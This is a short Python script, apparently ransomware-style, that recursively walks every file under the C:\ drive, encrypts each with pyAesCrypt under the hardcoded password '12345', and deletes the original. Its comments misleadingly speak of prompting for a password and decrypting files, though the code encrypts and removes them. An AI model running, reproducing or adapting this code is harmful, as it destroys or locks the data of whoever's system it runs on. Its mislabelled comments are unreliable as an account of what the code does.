import pyAesCrypt
import os
import glob

# Encryption/decryption buffer size - 64K

bufferSize = 64 * 1024
# Get current directory
curDir = os.getcwd()

# Prompt user for password to decrypt files
password1 = "12345"

# Main loop to decrypt all files in recursively
for x in glob.glob('C:\\**\*', recursive=True): # C:\Program Files\JetBrains\WebStorm 2023.2.2
    fullpath = os.path.join(curDir, x)
    fullnewf = os.path.join(curDir, x + '.encrypt')


    # Encrypt
    if os.path.isfile(fullpath):
        print('>>> Original: \t' + fullpath + '')
        print('>>> Encrypt: \t' + fullnewf + '\n')
        pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
        # Remove file after encryption
        os.remove(fullpath)




